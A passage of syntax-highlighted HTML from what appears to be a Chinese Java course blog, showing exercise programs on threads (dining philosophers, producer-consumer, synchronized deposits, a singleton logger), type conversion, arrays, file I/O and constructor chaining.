think();</span><br><span class=\"line\">                state = <span class=\"string\">'L'</span>;<span class=\"comment\">//Picking Left Chopsticks</span></span><br><span class=\"line\">                sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">                L.pickup();</span><br><span class=\"line\">                state = <span class=\"string\">'R'</span>;<span class=\"comment\">//Picking Right Chopsticks</span></span><br><span class=\"line\">                sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">                R.pickup();</span><br><span class=\"line\">                state = <span class=\"string\">'E'</span>;<span class=\"comment\">//Eating</span></span><br><span class=\"line\">                eat();</span><br><span class=\"line\">                L.putdown();</span><br><span class=\"line\">                R.putdown();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            state = <span class=\"string\">'o'</span>;<span class=\"comment\">//over</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e)&#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Work10_5</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> Fork[] fork = <span class=\"keyword\">new</span> Fork[<span class=\"number\">5</span>];</span><br><span class=\"line\">    <span class=\"keyword\">static</span> Philosopher[] philo = <span class=\"keyword\">new</span> Philosopher[<span class=\"number\">5</span>];</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i, j = <span class=\"number\">0</span>, k = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> goOn;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            fork[i] = <span class=\"keyword\">new</span> Fork(i);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            philo[i] = <span class=\"keyword\">new</span> Philosopher(fork[i], fork[(i + <span class=\"number\">1</span>) % <span class=\"number\">5</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        philo[<span class=\"number\">4</span>] = <span class=\"keyword\">new</span> Philosopher(fork[<span class=\"number\">0</span>], fork[<span class=\"number\">4</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            philo[i].start();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> newPrio = Thread.currentThread().getPriority() + <span class=\"number\">1</span>;</span><br><span class=\"line\">        Thread.currentThread().setPriority(newPrio);</span><br><span class=\"line\">        goOn = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (goOn) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                System.out.print(philo[i].state+<span class=\"string\">\"\\t\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.println();</span><br><span class=\"line\">            goOn = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                goOn |= philo[i].state != <span class=\"string\">'o'</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                Thread.sleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"练习\"><a href=\"#练习\" class=\"headerlink\" title=\"练习\"></a>练习</h1><h2 id=\"AccountProducerConsumer\"><a href=\"#AccountProducerConsumer\" class=\"headerlink\" title=\"AccountProducerConsumer\"></a>AccountProducerConsumer</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AccountProducerConsumer</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> Account account=<span class=\"keyword\">new</span> Account();</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        ExecutorService exec=Executors.newFixedThreadPool(<span class=\"number\">2</span>);</span><br><span class=\"line\">        exec.execute(<span class=\"keyword\">new</span> DepositTask());</span><br><span class=\"line\">        exec.execute(<span class=\"keyword\">new</span> WithdrawTask());</span><br><span class=\"line\">        exec.shutdown();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Account</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> balance=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">deposit</span><span class=\"params\">(<span class=\"keyword\">int</span> amount)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.notifyAll();</span><br><span class=\"line\">        balance+=amount;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Deposit \"</span>+amount+<span class=\"string\">\":balance = \"</span>+getBalance());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">withdraw</span><span class=\"params\">(<span class=\"keyword\">int</span> amount)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(balance&lt;amount)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.wait();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">catch</span>(InterruptedException e)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        balance-=amount;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Withdraw \"</span>+amount+<span class=\"string\">\"; balance = \"</span>+getBalance());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">getBalance</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> balance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DepositTask</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"keyword\">true</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            AccountProducerConsumer.account.deposit(<span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"keyword\">try</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                Thread.sleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">catch</span>(InterruptedException e)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">WithdrawTask</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"keyword\">true</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            AccountProducerConsumer.account.withdraw(<span class=\"number\">5</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"AddAccountSync\"><a href=\"#AddAccountSync\" class=\"headerlink\" title=\"AddAccountSync\"></a>AddAccountSync</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AddAccountSync</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> Account account=<span class=\"keyword\">new</span> Account();</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">100</span>;i++)</span><br><span class=\"line\">            <span class=\"keyword\">new</span> Thread(<span class=\"keyword\">new</span> TaskSync()).start();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Final balance: \"</span>+account.getBalance());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TaskSync</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">synchronized</span>(AddAccountSync.account)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            AddAccountSync.account.deposit(<span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Account</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> balance=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">deposit</span><span class=\"params\">(<span class=\"keyword\">int</span> amount)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> tmp=balance+amount;</span><br><span class=\"line\">        Thread.yield();</span><br><span class=\"line\">        balance=tmp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">getBalance</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> balance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"GetLockAgain\"><a href=\"#GetLockAgain\" class=\"headerlink\" title=\"GetLockAgain\"></a>GetLockAgain</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">GetLockAgain</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">mtd</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Entered Critical Section in mtd()\"</span>);</span><br><span class=\"line\">        mtd2();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">mtd2</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Entered Critical Section in mtd2()\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        mtd();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Thread(<span class=\"keyword\">new</span> GetLockAgain()).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Logger\"><a href=\"#Logger\" class=\"headerlink\" title=\"Logger\"></a>Logger</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Logger</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">static</span> Logger logger=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">3</span>;i++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"I'm writing in the log...\\n\"</span>);</span><br><span class=\"line\">                Thread.sleep((<span class=\"keyword\">long</span>)(Math.random()*<span class=\"number\">3000</span>));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">catch</span>(Exception e)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Logger</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Logger <span class=\"title\">getInstance</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (logger== <span class=\"keyword\">null</span>)  &#123;</span><br><span class=\"line\">            <span class=\"keyword\">synchronized</span> (Logger.class)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (logger== <span class=\"keyword\">null</span>)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    logger= <span class=\"keyword\">new</span> Logger();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> logger;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        Thread t1=<span class=\"keyword\">new</span> Thread(Logger.getInstance());</span><br><span class=\"line\">        Thread t2=<span class=\"keyword\">new</span> Thread(Logger.getInstance());</span><br><span class=\"line\">        Thread t3=<span class=\"keyword\">new</span> Thread(Logger.getInstance());</span><br><span class=\"line\">        t1.start();</span><br><span class=\"line\">        t2.start();</span><br><span class=\"line\">        t3.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ArrayCopy-Length\"><a href=\"#ArrayCopy-Length\" class=\"headerlink\" title=\"ArrayCopy_Length\"></a>ArrayCopy_Length</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ArrayCopy_Length</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">char</span>[] src=&#123;<span class=\"string\">'h'</span>,<span class=\"string\">'o'</span>,<span class=\"string\">'w'</span>,<span class=\"string\">' '</span>,<span class=\"string\">'a'</span>,<span class=\"string\">'r'</span>,<span class=\"string\">'e'</span>,<span class=\"string\">' '</span>,<span class=\"string\">'y'</span>,<span class=\"string\">'o'</span>,<span class=\"string\">'u'</span>&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">char</span>[] target=<span class=\"keyword\">new</span> <span class=\"keyword\">char</span>[<span class=\"number\">3</span>];</span><br><span class=\"line\">        System.arraycopy(src,<span class=\"number\">4</span>,target,<span class=\"number\">0</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"keyword\">new</span> String(target));</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[][] a=&#123;&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;,&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>&#125;&#125;;</span><br><span class=\"line\">        System.out.println(a.length+<span class=\"string\">\";\"</span>+a[<span class=\"number\">0</span>].length+<span class=\"string\">\";\"</span>+a[<span class=\"number\">1</span>].length);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"AssignConversion\"><a href=\"#AssignConversion\" class=\"headerlink\" title=\"AssignConversion\"></a>AssignConversion</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AssignConversion</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i=<span class=\"number\">123456789</span>;</span><br><span class=\"line\">        <span class=\"keyword\">long</span> l=<span class=\"number\">9123456789000000000L</span>;</span><br><span class=\"line\">        <span class=\"keyword\">float</span> f;</span><br><span class=\"line\">        <span class=\"keyword\">double</span> d</span><br><span class=\"line\">        ;</span><br><span class=\"line\"></span><br><span class=\"line\">        f=i;<span class=\"comment\">//损失精度</span></span><br><span class=\"line\">        System.out.println(f);</span><br><span class=\"line\">        f=l;<span class=\"comment\">//损失精度</span></span><br><span class=\"line\">        System.out.println(f);</span><br><span class=\"line\">        d=l;<span class=\"comment\">//损失精度</span></span><br><span class=\"line\">        System.out.println(d);</span><br><span class=\"line\">        f=<span class=\"number\">1.23f</span>;</span><br><span class=\"line\">        d=f;<span class=\"comment\">//损失精度</span></span><br><span class=\"line\">        System.out.println(d);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"BinaryConversion\"><a href=\"#BinaryConversion\" class=\"headerlink\" title=\"BinaryConversion\"></a>BinaryConversion</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BinaryConversion</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">float</span> f=<span class=\"number\">2.0f</span>;</span><br><span class=\"line\">        <span class=\"keyword\">double</span> d=<span class=\"number\">4.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//首先 float*int转换为loat*float然后float==double转换为ouble==double</span></span><br><span class=\"line\">        System.out.println(f*i==d);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">byte</span> b=<span class=\"number\">0x1f</span>;</span><br><span class=\"line\">        <span class=\"keyword\">char</span> c=<span class=\"string\">'G'</span>;</span><br><span class=\"line\">        System.out.println(Integer.toHexString(b&amp;c));<span class=\"comment\">//byte&amp;byte转换为nt&amp;int</span></span><br><span class=\"line\"></span><br><span class=\"line\">        f=(b==<span class=\"number\">0</span>)?i:<span class=\"number\">6.0f</span>;                    <span class=\"comment\">//int:float转换为loat:float</span></span><br><span class=\"line\">        System.out.println(f/<span class=\"number\">2.0</span>);          <span class=\"comment\">//float/doublet转换为ouble/double</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"BufferedIO\"><a href=\"#BufferedIO\" class=\"headerlink\" title=\"BufferedIO\"></a>BufferedIO</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> chap08;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BufferedIO</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span> <span class=\"keyword\">throws</span> IOException</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        BufferedReader in=<span class=\"keyword\">new</span> BufferedReader(<span class=\"keyword\">new</span> FileReader(<span class=\"string\">\"chap08\\\\BufferedIO.java\"</span>));</span><br><span class=\"line\">        PrintWriter out=<span class=\"keyword\">new</span> PrintWriter(<span class=\"keyword\">new</span> BufferedWriter(<span class=\"keyword\">new</span> FileWriter(<span class=\"string\">\"chap08\\\\BufferedIO.txt\"</span>)));</span><br><span class=\"line\">        String s;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> linecnt=<span class=\"number\">1</span>;</span><br><span class=\"line\">        StringBuilder sb=<span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">        <span class=\"keyword\">while</span>((s=in.readLine())!=<span class=\"keyword\">null</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            sb.append(linecnt+<span class=\"string\">\";\"</span>+s+<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">            out.println(linecnt+<span class=\"string\">\";\"</span>+s);</span><br><span class=\"line\">            linecnt++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        in.close();</span><br><span class=\"line\">        out.close();</span><br><span class=\"line\">        System.out.print(sb.toString());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ConstructSubObj\"><a href=\"#ConstructSubObj\" class=\"headerlink\" title=\"ConstructSubObj\"></a>ConstructSubObj</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ConstructSubObj</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        Undergraduate ug=<span class=\"keyword\">new</span> Undergraduate(<span class=\"number\">12345678</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    Person()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Person\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Student</span> <span class=\"keyword\">extends</span> <span class=\"title\">Person</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    Student(<span class=\"keyword\">int</span> id)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Student\"</span>+id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Undergraduate</span> <span class=\"keyword\">extends</span> <span class=\"title\">Student</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    Undergraduate(<span class=\"keyword\">int</span> id)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(id);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Undergraduate\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"HelloWorld\"><a href=\"#HelloWorld\" class=\"headerlink\" title=\"HelloWorld\"></a>HelloWorld</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HelloWorld</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Hello 